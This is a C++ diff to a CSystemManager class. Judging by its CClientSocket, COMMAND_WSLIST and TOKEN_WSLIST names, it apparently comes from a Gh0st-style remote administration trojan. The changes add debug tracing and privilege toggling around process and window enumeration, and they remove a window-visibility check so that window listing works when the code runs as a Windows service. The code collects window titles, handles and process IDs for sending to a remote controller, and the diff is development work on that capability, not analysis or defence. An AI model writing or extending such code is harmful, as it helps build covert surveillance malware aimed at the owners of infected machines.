@@ -26,6 +26,7 @@ CSystemManager::CSystemManager(CClientSocket *pClient, BOOL bHow) : CManager(pCl
 	}
 	else if (m_bHow == COMMAND_WSLIST)   //如果是获取窗口
 	{
+		OutputDebugString("COMMAND_WSLIST");
 		SendWindowsList();
 	}
 }
@@ -65,7 +66,9 @@ void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 void CSystemManager::SendProcessList()
 {
 	UINT	nRet = -1;
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
 	LPBYTE	lpBuffer = getProcessList();
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, FALSE);
 	if (lpBuffer == NULL)
 		return;
 	
@@ -76,7 +79,9 @@ void CSystemManager::SendProcessList()
 void CSystemManager::SendWindowsList()
 {
 	UINT	nRet = -1;
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
 	LPBYTE	lpBuffer = getWindowsList();
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, FALSE);
 	if (lpBuffer == NULL)
 		return;
 
@@ -233,8 +238,9 @@ void CSystemManager::ShutdownWindows( DWORD dwReason )
 	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
 }
 
-bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
+BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
+	OutputDebugString("EnumWindowsProc");
 	DWORD	dwLength = 0;
 	DWORD	dwOffset = 0;
 	DWORD	dwProcessID = 0;
@@ -242,38 +248,41 @@ bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	
 	char	strTitle[1024];
 	memset(strTitle, 0, sizeof(strTitle));
-	GetWindowText(hwnd, strTitle, sizeof(strTitle));
-	
-	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
+	::GetWindowText(hwnd, strTitle, sizeof(strTitle));
+	   	
+	//if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)strTitle[0] == '\0'
+	if (lstrlen(strTitle) == 0)//!IsWindowVisible(hwnd) 在服务启动中会出错
+	{
 		return true;
-	
-	
-	if (lpBuffer == NULL)
-		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
-	
-	dwLength = sizeof(DWORD) + sizeof(DWORD) + lstrlen(strTitle) + 1;
-	dwOffset = LocalSize(lpBuffer);
-	
-	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer,dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
-	
-	
-	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
-	dwOffset += sizeof(DWORD);
-	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
-	dwOffset += sizeof(DWORD);
-	memcpy(lpBuffer + dwOffset, strTitle, lstrlen(strTitle) + 1);
-	//memcpy(lpBuffer + dwOffset + sizeof(DWORD), hwnd, sizeof(HWND) + 1);
+	}
+		OutputDebugString(strTitle);
 
-	
-	*(LPBYTE *)lParam = lpBuffer;
-	
+		if (lpBuffer == NULL)
+			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
+
+		dwLength = sizeof(DWORD) + sizeof(DWORD) + lstrlen(strTitle) + 1;
+		dwOffset = LocalSize(lpBuffer);
+
+		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
+
+
+		memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
+		dwOffset += sizeof(DWORD);
+		GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
+		dwOffset += sizeof(DWORD);
+		memcpy(lpBuffer + dwOffset, strTitle, lstrlen(strTitle) + 1);
+		//memcpy(lpBuffer + dwOffset + sizeof(DWORD), hwnd, sizeof(HWND) + 1);
+
+
+		*(LPBYTE*)lParam = lpBuffer;		
+
 	return true;
 }
 
 LPBYTE CSystemManager::getWindowsList()
 {
 	LPBYTE	lpBuffer = NULL;
-	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
+	::EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
 	lpBuffer[0] = TOKEN_WSLIST;
 	return lpBuffer;	
 }
